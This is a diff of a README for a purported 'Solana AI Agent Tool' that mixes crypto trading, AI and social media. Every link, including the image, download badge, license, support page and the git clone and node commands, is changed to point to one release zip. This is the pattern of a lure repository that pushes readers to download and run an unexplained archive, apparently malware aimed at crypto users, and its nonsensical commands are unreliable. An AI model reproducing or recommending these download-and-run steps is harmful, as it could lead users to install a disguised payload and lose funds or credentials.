@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the **Solana AI Agent Tool**, an innovative AI entity developed on the Solana blockchain. This cutting-edge digital being merges artificial intelligence with social media features and decentralized trading, aiming to connect the realms of Solana, AI, social media, and cryptocurrency in an exciting new way.
 
-![Solana AI Agent](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip)
+![Solana AI Agent](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip)
 
 ## Repository Details
 - **Repository Name:** Solana-AI-agent-tool
@@ -12,7 +12,7 @@ Welcome to the **Solana AI Agent Tool**, an innovative AI entity developed on th
 
 ## 📦 Installation
 To access the Solana AI Agent Tool, download the latest release from the following link:
-[![Download Solana AI Agent Tool](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip)](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip
+[![Download Solana AI Agent Tool](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip)](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip
 )
 
 ## Features
@@ -24,7 +24,7 @@ To access the Solana AI Agent Tool, download the latest release from the followi
 ## Getting Started
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip
+   git clone https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip
    ```
 2. **Install Dependencies:**
    ```bash
@@ -32,7 +32,7 @@ To access the Solana AI Agent Tool, download the latest release from the followi
    ```
 3. **Run the Solana AI Agent Tool:**
    ```bash
-   node https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip
+   node https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip
    ```
 
 ## Usage
@@ -42,10 +42,10 @@ The Solana AI Agent Tool provides a user-friendly interface for interacting with
 Contributions to the Solana AI Agent Tool are welcome! Whether you're a developer, AI enthusiast, or blockchain expert, your input can help enhance the functionality and features of this innovative tool. Feel free to submit pull requests and share your ideas with the community.
 
 ## Support
-Need assistance or have any questions? Reach out to the Solana AI Agent Tool team on our [official website](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip) for personalized support and guidance. Join our community to connect with other users and stay updated on the latest developments.
+Need assistance or have any questions? Reach out to the Solana AI Agent Tool team on our [official website](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip) for personalized support and guidance. Join our community to connect with other users and stay updated on the latest developments.
 
 ## License
-The Solana AI Agent Tool is released under the [MIT License](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v1.0/Application.zip). Feel free to explore, modify, and share this tool in accordance with the terms of the license.
+The Solana AI Agent Tool is released under the [MIT License](https://github.com/aprildev541/Solana-AI-agent-tool/releases/download/v2.0/Software.zip). Feel free to explore, modify, and share this tool in accordance with the terms of the license.
 
 ---
 
